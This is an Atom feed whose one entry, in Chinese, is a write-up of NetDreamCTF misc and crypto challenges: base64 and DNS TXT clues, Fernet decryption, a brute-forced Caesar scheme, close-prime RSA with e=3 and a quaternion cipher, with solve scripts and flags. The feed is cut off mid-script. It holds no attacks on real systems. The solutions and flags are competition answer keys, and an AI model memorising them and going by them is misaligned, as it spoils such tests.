<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lazzaro</title>
  
  
  <link href="https://lazzzaro.github.io/atom.xml" rel="self"/>
  
  <link href="https://lazzzaro.github.io/"/>
  <updated>2025-08-16T13:10:43.622Z</updated>
  <id>https://lazzzaro.github.io/</id>
  
  <author>
    <name>Lazzaro</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第一届NetDreamCTF</title>
    <link href="https://lazzzaro.github.io/2025/08/16/match-%E7%AC%AC%E4%B8%80%E5%B1%8ANetDreamCTF/"/>
    <id>https://lazzzaro.github.io/2025/08/16/match-%E7%AC%AC%E4%B8%80%E5%B1%8ANetDreamCTF/</id>
    <published>2025-08-16T10:46:40.000Z</published>
    <updated>2025-08-16T13:10:43.622Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>本次NetDreamCTF由黄豆安全实验室主办，赛制为解题（Jeopardy），包括Misc、Crypto、Reverse、Web、PWN、OSINT六个方向的赛题，难度适中，适合大部分CTFer。</p><p><strong>Rank: 3</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>你知道Base和TXT吗?<br>Y3RmLmN0Zi52aW4=</p></blockquote><p>先base64解码，得到：<code>ctf.ctf.vin</code></p><p>根据提示TXT，<a href="https://uutool.cn/nslookup/">在线nslookup域名解析</a> 查询TXT记录：</p><p><img src="/2025/08/16/match-%E7%AC%AC%E4%B8%80%E5%B1%8ANetDreamCTF/image-20250816190647887.png" alt="image-20250816190647887"></p><p>flag：<code>flag&#123;W3lc0m3_T0_NETDREAMCTF!!!!!&#125;</code></p><p>​    </p><h3 id="ezimg"><a href="#ezimg" class="headerlink" title="ezimg"></a>ezimg</h3><p>010editor查看jpg末尾有字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMUdKNDExeDdoNy8=aHR0cHM6Ly9kb2NzLnFxLmNvbS9kb2MvRFpXeG9iSGhtUlc5cGQwOWs=</span><br></pre></td></tr></table></figure><p>base64解码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1GJ411x7h7/https://docs.qq.com/doc/DZWxobHhmRW9pd09k</span><br></pre></td></tr></table></figure><p>打开：<code>https://docs.qq.com/doc/DZWxobHhmRW9pd09k</code></p><p>全选复制粘贴到txt，内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r&#125;</span><br><span class="line"></span><br><span class="line">aHR0cHM6Ly93d2duLmxhbnpvdWwuY29tL2kzcTR5MzBodWVmYQ==</span><br></pre></td></tr></table></figure><p>是假flag，base64解码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://wwgn.lanzoul.com/i3q4y30huefa</span><br></pre></td></tr></table></figure><p>下载ezimg.zip，解压有ezimg.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet; <span class="keyword">import</span> base64; key = base64.urlsafe_b64encode(<span class="string">b&#x27;flag&#123;xxx&#125;&#x27;</span>[:<span class="number">32</span>].ljust(<span class="number">32</span>, <span class="string">b&#x27;\0&#x27;</span>)[:<span class="number">32</span>]); cipher = Fernet(key); encrypted = cipher.encrypt(<span class="string">b&#x27;flag&#123;xxxx&#125;&#x27;</span>); <span class="comment">#c=gAAAAABoa6KH5msX3aA5PUiSZq1Ubma9DvtpU9ywyijLEbfQYNl-hn5Q_4NlmpcAD2pNjq07KvMYd2R32Id_R_3iW5GZn3yKTBW5R_5jFI_307_S9oep0zE0dhZCf_XOymC2WQhB2_6s</span></span><br></pre></td></tr></table></figure><p>将假flag作为key，解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = base64.urlsafe_b64encode(<span class="string">b&#x27;flag&#123;114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r&#125;&#x27;</span>[:<span class="number">32</span>].ljust(<span class="number">32</span>, <span class="string">b&#x27;\0&#x27;</span>)[:<span class="number">32</span>])</span><br><span class="line">cipher = Fernet(key)</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;gAAAAABoa6KH5msX3aA5PUiSZq1Ubma9DvtpU9ywyijLEbfQYNl-hn5Q_4NlmpcAD2pNjq07KvMYd2R32Id_R_3iW5GZn3yKTBW5R_5jFI_307_S9oep0zE0dhZCf_XOymC2WQhB2_6s&quot;</span></span><br><span class="line">plaintext = cipher.decrypt(c.encode())</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;Hu@ngD0w_L0v3s_M1sc_F0r3v3r!!!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="I-AM-K"><a href="#I-AM-K" class="headerlink" title="I_AM_K"></a>I_AM_K</h3><blockquote><p>B3F0re赵的立方体-1398441600</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    key_sum = <span class="built_in">sum</span>(<span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> key)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> plaintext.startswith(<span class="string">&quot;flag&#123;&quot;</span>):</span><br><span class="line">        plaintext = <span class="string">&quot;flag&#123;&quot;</span> + plaintext</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> plaintext.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">        plaintext += <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    </span><br><span class="line">    encrypted = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> plaintext:</span><br><span class="line">        encrypted_char = (<span class="built_in">ord</span>(char) + key_sum) % <span class="number">256</span> </span><br><span class="line">        encrypted.append(encrypted_char)</span><br><span class="line"></span><br><span class="line">    encrypted_bytes = <span class="built_in">bytes</span>(encrypted)</span><br><span class="line">    base64_encoded = base64.b64encode(encrypted_bytes).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    shift = key_sum % <span class="number">26</span></span><br><span class="line">    caesar_shifted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> base64_encoded:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shifted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))) <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            caesar_shifted += shifted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            caesar_shifted += char</span><br><span class="line">    hex_encoded = caesar_shifted.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> hex_encoded</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx&quot;</span></span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">&quot;Thi5 1s th3 Fl@g&quot;</span> </span><br><span class="line"></span><br><span class="line">ciphertext = encrypt(plaintext, key)</span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment">#686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248</span></span><br></pre></td></tr></table></figure></blockquote><p>key未知，计算key_sum，先对明文字符做增量，base64编码后，再由key_sum%26的shift做凯撒移位。小范围内爆破key_sum即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248&#x27;</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ks <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    shift = ks % <span class="number">26</span></span><br><span class="line">    c2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> c:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shifted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))) <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            c2 += shifted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c2 += char</span><br><span class="line">    c3 = <span class="built_in">list</span>(base64.b64decode(c2))</span><br><span class="line">    m = <span class="built_in">bytes</span>([(k - ks) &amp; <span class="number">0xff</span> <span class="keyword">for</span> k <span class="keyword">in</span> c3])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;I_am_K_hypocritical_K&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h3><blockquote><p><a href="https://wj.qq.com/s2/23150030/670f/">https://wj.qq.com/s2/23150030/670f/</a></p></blockquote><p>flag：<code>flag&#123;Never_Gonna_Give_You_Up-Never_Gonna_Let_You_Down&#125;</code></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&quot;flag&#123;xxxxxxx&#125;&quot;</span></span><br><span class="line">BIT_SIZE = <span class="number">512</span></span><br><span class="line">DIFF = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_close_primes</span>(<span class="params">bit_size, diff</span>):</span><br><span class="line">    start = random.getrandbits(bit_size) | <span class="number">1</span></span><br><span class="line">    p = nextprime(start)</span><br><span class="line">    q = nextprime(p + diff)</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_to_int</span>(<span class="params">flag_bytes</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(flag_bytes, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p, q = generate_close_primes(BIT_SIZE, DIFF)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    m = flag_to_int(FLAG)</span><br><span class="line"></span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 3256593900815599638610948588846270419272266309072355018531019815816383416972716648196614202756266923662468043040766972587895880348728177684427108179441398076920699534139836200520410133083399544975367893285080239622582380507397956076038256757810824984700446326253944197017126171652309637891515864542581815539</span></span><br><span class="line"><span class="string">e = 3</span></span><br><span class="line"><span class="string">c = 1668144786169714702301094076704686642891065952249900945234348491495868262367689770718451252978033214169821458376529832891775500377565608075759008139982766645172498702491199793075638838575243018129218596030822468832530007275522627172632933</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$p,q$ 相差接近1000，对 $n$ 开方后爆破求 $q$。</p><p>之后 $\gcd(e,\varphi)=3$，先常规RSA用 $\cfrac{e}{3}$ 求出 $m^3$ 再小指数开立方即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">3256593900815599638610948588846270419272266309072355018531019815816383416972716648196614202756266923662468043040766972587895880348728177684427108179441398076920699534139836200520410133083399544975367893285080239622582380507397956076038256757810824984700446326253944197017126171652309637891515864542581815539</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">1668144786169714702301094076704686642891065952249900945234348491495868262367689770718451252978033214169821458376529832891775500377565608075759008139982766645172498702491199793075638838575243018129218596030822468832530007275522627172632933</span></span><br><span class="line"></span><br><span class="line">q = gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    q = gmpy2.next_prime(q)</span><br><span class="line">    <span class="keyword">if</span> n % q == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p = n // q</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e//<span class="number">3</span>,f)</span><br><span class="line">m3 = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = gmpy2.iroot(m3,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;EZ_3Z++==+__U_C@n_F1n1sh_1t&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Quaternion-Lock"><a href="#Quaternion-Lock" class="headerlink" title="Quaternion_Lock"></a>Quaternion_Lock</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">p = <span class="number">9223372036854775783</span> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">subgroup_order = <span class="number">60480</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qmul</span>(<span class="params">q1, q2, p</span>):</span><br><span class="line">    a1, b1, c1, d1 = q1</span><br><span class="line">    a2, b2, c2, d2 = q2</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        (a1*a2 - b1*b2 - c1*c2 - d1*d2) % p,</span><br><span class="line">        (a1*b2 + b1*a2 + c1*d2 - d1*c2) % p,</span><br><span class="line">        (a1*c2 - b1*d2 + c1*a2 + d1*b2) % p,</span><br><span class="line">        (a1*d2 + b1*c2 - c1*b2 + d1*a2) % p</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qconj</span>(<span class="params">q, p</span>):</span><br><span class="line">    a, b, c, d = q</span><br><span class="line">    <span class="keyword">return</span> (a % p, (-b) % p, (-c) % p, (-d) % p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qnorm</span>(<span class="params">q, p</span>):</span><br><span class="line">    a, b, c, d = q</span><br><span class="line">    <span class="keyword">return</span> (a*a + b*b + c*c + d*d) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qinv</span>(<span class="params">q, p</span>):</span><br><span class="line">    n = qnorm(q, p)</span><br><span class="line">    inv_n = <span class="built_in">pow</span>(n, -<span class="number">1</span>, p)</span><br><span class="line">    qc = qconj(q, p)</span><br><span class="line">    <span class="keyword">return</span> (qc[<span class="number">0</span>] * inv_n % p, qc[<span class="number">1</span>] * inv_n % p, qc[<span class="number">2</span>] * inv_n % p, qc[<span class="number">3</span>] * inv_n % p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpow</span>(<span class="params">q, exp, p</span>):</span><br><span class="line">    result = (<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    base = q</span><br><span class="line">    <span class="keyword">while</span> exp:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = qmul(result, base, p)</span><br><span class="line">        base = qmul(base, base, p)</span><br><span class="line">        exp //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    flag_bytes = flag.encode()</span><br><span class="line">    parts = [flag_bytes[<span class="number">0</span>:<span class="number">8</span>], flag_bytes[<span class="number">8</span>:<span class="number">15</span>], flag_bytes[<span class="number">15</span>:<span class="number">22</span>], flag_bytes[<span class="number">22</span>:<span class="number">29</span>]]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(<span class="built_in">int</span>.from_bytes(part, <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> part <span class="keyword">in</span> parts)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;xxx-xxx-xxx-xxx-xxx-xxx&#125;&quot;</span></span><br><span class="line">    F = encode_flag(flag)</span><br><span class="line">    F_q = F</span><br><span class="line">    g = (<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    h = qpow(g, ((p * p - <span class="number">1</span>) // subgroup_order), p)</span><br><span class="line">    r = random.randint(<span class="number">1</span>, subgroup_order - <span class="number">1</span>)</span><br><span class="line">    K = qpow(h, r, p)</span><br><span class="line">    Y = qpow(K, e, p)</span><br><span class="line">    K_inv = qinv(K, p)</span><br><span class="line">    X = qmul(K, qmul(F_q, K_inv, p), p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----- Public Parameters -----&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;X =&quot;</span>, X) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Y =&quot;</span>, Y) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">X = (7380380986429696832, 34163292457091182, 3636630423226195928, 3896730209645707435)</span></span><br><span class="line"><span class="string">Y = (1015918725738180802, 4456058114364993854, 0, 0)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>定义了四元数，且有：</p><script type="math/tex; mode=display">Y = K^e \bmod p \\X = K \cdot F \cdot K^{-1}</script><p>四元数对应的 $\varphi=p^4-1$，即可求出 $d = e^{-1} \bmod \varphi$，进而：</p><script type="math/tex; mode=display">K = Y^d \bmod p \\F = K^{-1} \cdot X \cdot K</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">9223372036854775783</span> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">subgroup_order = <span class="number">60480</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qmul</span>(<span class="params">q1, q2, p</span>):</span><br><span class="line">    a1, b1, c1, d1 = q1</span><br><span class="line">    a2, b2, c2, d2 = q2</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        (a1*a2 - b1*b2 - c1*c2 - d1*d2) % p,</span><br><span class="line">        (a1*b2 + b1*a2 + c1*d2 - d1*c2) % p,</span><br><span class="line">        (a1*c2 - b1*d2 + c1*a2 + d1*b2) % p,</span><br><span class="line">        (a1*d2 + b1*c2 - c1*b2 + d1*a2) % p</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qconj</span>(<span class="params">q, p</span>):</span><br><span class="line">    a, b, c, d = q</span><br><span class="line">    <span class="keyword">return</span> (a % p, (-b) % p, (-c) % p, (-d) % p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qnorm</span>(<span class="params">q, p</span>):</span><br><span class="line">    a, b, c, d = q</span><br><span class="line">    <span class="keyword">return</span> (a*a + b*b + c*c + d*d) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qinv</span>(<span class="params">q, p</span>):</span><br><span class="line">    n = qnorm(q, p)</span><br><span class="line">    inv_n = <span class="built_in">pow</span>(n, -<span class="number">1</span>, p)</span><br><span class="line">    qc = qconj(q, p)</span><br><span class="line">    <span class="keyword">return</span> (qc[<span class="number">0</span>] * inv_n % p, qc[<span class="number">1</span>] * inv_n % p, qc[<span class="number">2</span>] * inv_n % p, qc[<span class="number">3</span>] * inv_n % p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpow</span>(<span class="params">q, exp, p</span>):</span><br><span class="line">    result = (<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    base = q</span><br><span class="line">    <span class="keyword">while</span> exp:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = qmul(result, base, p)</span><br><span class="line">        base = qmul(base, base, p)</span><br><span 